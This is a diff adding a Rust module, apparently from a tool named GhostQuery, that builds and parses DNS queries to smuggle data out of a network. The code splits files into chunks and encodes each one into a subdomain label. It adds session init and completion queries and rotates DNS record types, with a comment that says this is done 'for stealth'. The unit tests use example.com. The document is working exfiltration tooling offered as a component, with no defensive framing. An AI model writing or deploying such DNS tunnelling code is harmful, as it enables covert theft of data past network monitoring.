@@ -1,0 +1,304 @@
+//! DNS query construction for data exfiltration.
+//!
+//! Encodes chunk data into DNS subdomain labels using the format:
+//! [payload].[sequence].[session].<domain>
+
+use crate::common::constants::MAX_LABEL_LENGTH;
+use crate::common::error::{GhostQueryError, Result};
+use crate::common::types::{Chunk, ChunkId, DnsRecordType, SessionId};
+use crate::encoding::GhostEncoder;
+
+/// A DNS query for exfiltrating data
+#[derive(Debug, Clone)]
+pub struct DnsQuery {
+    /// The full QNAME (subdomain.domain)
+    pub qname: String,
+    /// Record type to request
+    pub record_type: DnsRecordType,
+    /// Session ID (for tracking)
+    pub session_id: SessionId,
+    /// Chunk ID being sent
+    pub chunk_id: ChunkId,
+    /// Whether this is the final chunk
+    pub is_final: bool,
+}
+
+impl DnsQuery {
+    /// Create a new DNS query from a chunk
+    pub fn from_chunk(
+        chunk: &Chunk,
+        session_id: SessionId,
+        domain: &str,
+        record_type: DnsRecordType,
+    ) -> Result<Self> {
+        let encoder = GhostEncoder::new();
+
+        // Encode the chunk data
+        let payload = encoder.encode_chunk(&chunk.data)?;
+
+        // Build the QNAME: payload.seq-XXXXXX.session.<domain>
+        let seq_label = format!("seq-{:06x}", chunk.id.as_u32());
+        let session_label = session_id.to_hex();
+
+        // Check label lengths
+        if payload.len() > MAX_LABEL_LENGTH {
+            return Err(GhostQueryError::EncodingError(format!(
+                "Payload label too long: {} > {}",
+                payload.len(),
+                MAX_LABEL_LENGTH
+            )));
+        }
+
+        let qname = format!("{}.{}.{}.{}", payload, seq_label, session_label, domain);
+
+        Ok(Self {
+            qname,
+            record_type,
+            session_id,
+            chunk_id: chunk.id,
+            is_final: chunk.is_final,
+        })
+    }
+
+    /// Create a session initialization query
+    pub fn session_init(session_id: SessionId, file_hash: &str, domain: &str) -> Self {
+        let qname = format!("init.{}.{}.{}", file_hash, session_id.to_hex(), domain);
+
+        Self {
+            qname,
+            record_type: DnsRecordType::TXT,
+            session_id,
+            chunk_id: ChunkId::new(0),
+            is_final: false,
+        }
+    }
+
+    /// Create a session completion query
+    pub fn session_complete(session_id: SessionId, domain: &str) -> Self {
+        let qname = format!("done.{}.{}", session_id.to_hex(), domain);
+
+        Self {
+            qname,
+            record_type: DnsRecordType::TXT,
+            session_id,
+            chunk_id: ChunkId::new(u32::MAX),
+            is_final: true,
+        }
+    }
+
+    /// Get the record type as a string
+    pub fn record_type_str(&self) -> &'static str {
+        match self.record_type {
+            DnsRecordType::A => "A",
+            DnsRecordType::AAAA => "AAAA",
+            DnsRecordType::CNAME => "CNAME",
+            DnsRecordType::MX => "MX",
+            DnsRecordType::TXT => "TXT",
+        }
+    }
+}
+
+/// Parse a DNS query QNAME to extract session and chunk info
+#[derive(Debug)]
+pub struct ParsedQuery {
+    pub payload: String,
+    pub sequence: u32,
+    pub session_id: SessionId,
+    pub is_init: bool,
+    pub is_done: bool,
+}
+
+impl ParsedQuery {
+    /// Parse a QNAME into its components
+    pub fn parse(qname: &str, domain: &str) -> Result<Self> {
+        // Remove the domain suffix
+        let prefix = qname
+            .strip_suffix(&format!(".{}", domain))
+            .or_else(|| qname.strip_suffix(domain))
+            .ok_or_else(|| {
+                GhostQueryError::InvalidDomainFormat(format!("Expected domain {}", domain))
+            })?;
+
+        let parts: Vec<&str> = prefix.split('.').collect();
+
+        if parts.len() < 2 {
+            return Err(GhostQueryError::InvalidDomainFormat(
+                "Not enough labels".to_string(),
+            ));
+        }
+
+        // Check for special queries
+        if parts[0] == "init" {
+            // init.hash.session
+            if parts.len() < 3 {
+                return Err(GhostQueryError::InvalidDomainFormat(
+                    "Invalid init query".to_string(),
+                ));
+            }
+            let session_id = SessionId::from_hex(parts[2]).map_err(|_| {
+                GhostQueryError::InvalidDomainFormat("Invalid session ID".to_string())
+            })?;
+
+            return Ok(Self {
+                payload: parts[1].to_string(),
+                sequence: 0,
+                session_id,
+                is_init: true,
+                is_done: false,
+            });
+        }
+
+        if parts[0] == "done" {
+            // done.session
+            let session_id = SessionId::from_hex(parts[1]).map_err(|_| {
+                GhostQueryError::InvalidDomainFormat("Invalid session ID".to_string())
+            })?;
+
+            return Ok(Self {
+                payload: String::new(),
+                sequence: u32::MAX,
+                session_id,
+                is_init: false,
+                is_done: true,
+            });
+        }
+
+        // Normal data query: payload.seq-XXXXXX.session
+        if parts.len() < 3 {
+            return Err(GhostQueryError::InvalidDomainFormat(
+                "Not enough labels for data query".to_string(),
+            ));
+        }
+
+        let payload = parts[0].to_string();
+
+        // Parse sequence number
+        let seq_part = parts[1];
+        if !seq_part.starts_with("seq-") {
+            return Err(GhostQueryError::InvalidDomainFormat(
+                "Invalid sequence label".to_string(),
+            ));
+        }
+        let sequence = u32::from_str_radix(&seq_part[4..], 16).map_err(|_| {
+            GhostQueryError::InvalidDomainFormat("Invalid sequence number".to_string())
+        })?;
+
+        // Parse session ID
+        let session_id = SessionId::from_hex(parts[2])
+            .map_err(|_| GhostQueryError::InvalidDomainFormat("Invalid session ID".to_string()))?;
+
+        Ok(Self {
+            payload,
+            sequence,
+            session_id,
+            is_init: false,
+            is_done: false,
+        })
+    }
+}
+
+/// Query builder for creating DNS queries with rotation
+pub struct QueryBuilder {
+    domain: String,
+    session_id: SessionId,
+    current_type: DnsRecordType,
+    encoder: GhostEncoder,
+}
+
+impl QueryBuilder {
+    /// Create a new query builder
+    pub fn new(domain: String, session_id: SessionId) -> Self {
+        Self {
+            domain,
+            session_id,
+            current_type: DnsRecordType::A,
+            encoder: GhostEncoder::new(),
+        }
+    }
+
+    /// Build a query for a chunk
+    pub fn build_chunk_query(&mut self, chunk: &Chunk) -> Result<DnsQuery> {
+        let query = DnsQuery::from_chunk(chunk, self.session_id, &self.domain, self.current_type)?;
+
+        // Rotate record type for stealth
+        self.current_type = self.current_type.next();
+
+        Ok(query)
+    }
+
+    /// Build an init query
+    pub fn build_init_query(&self, file_hash: &str) -> DnsQuery {
+        DnsQuery::session_init(self.session_id, file_hash, &self.domain)
+    }
+
+    /// Build a completion query
+    pub fn build_done_query(&self) -> DnsQuery {
+        DnsQuery::session_complete(self.session_id, &self.domain)
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_query_from_chunk() {
+        let session_id = SessionId::from_bytes([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08]);
+        let chunk = Chunk::new(ChunkId::new(0), vec![0xAB, 0xCD], false);
+
+        let query =
+            DnsQuery::from_chunk(&chunk, session_id, "example.com", DnsRecordType::A).unwrap();
+
+        assert!(query.qname.ends_with("example.com"));
+        assert!(query.qname.contains("seq-000000"));
+        assert_eq!(query.chunk_id, ChunkId::new(0));
+    }
+
+    #[test]
+    fn test_parse_query() {
+        let domain = "example.com";
+        let qname = "cdn-ab-01.seq-00002a.0102030405060708.example.com";
+
+        let parsed = ParsedQuery::parse(qname, domain).unwrap();
+
+        assert_eq!(parsed.sequence, 0x2a);
+        assert!(!parsed.is_init);
+        assert!(!parsed.is_done);
+    }
+
+    #[test]
+    fn test_parse_init_query() {
+        let domain = "example.com";
+        let qname = "init.abcdef123456.0102030405060708.example.com";
+
+        let parsed = ParsedQuery::parse(qname, domain).unwrap();
+
+        assert!(parsed.is_init);
+        assert_eq!(parsed.payload, "abcdef123456");
+    }
+
+    #[test]
+    fn test_parse_done_query() {
+        let domain = "example.com";
+        let qname = "done.0102030405060708.example.com";
+
+        let parsed = ParsedQuery::parse(qname, domain).unwrap();
+
+        assert!(parsed.is_done);
+    }
+
+    #[test]
+    fn test_query_builder_rotation() {
+        let session_id = SessionId::new();
+        let mut builder = QueryBuilder::new("example.com".to_string(), session_id);
+
+        let chunk = Chunk::new(ChunkId::new(0), vec![0x01, 0x02], false);
+
+        let q1 = builder.build_chunk_query(&chunk).unwrap();
+        let q2 = builder.build_chunk_query(&chunk).unwrap();
+
+        // Record types should rotate
+        assert_ne!(q1.record_type, q2.record_type);
+    }
+}
+
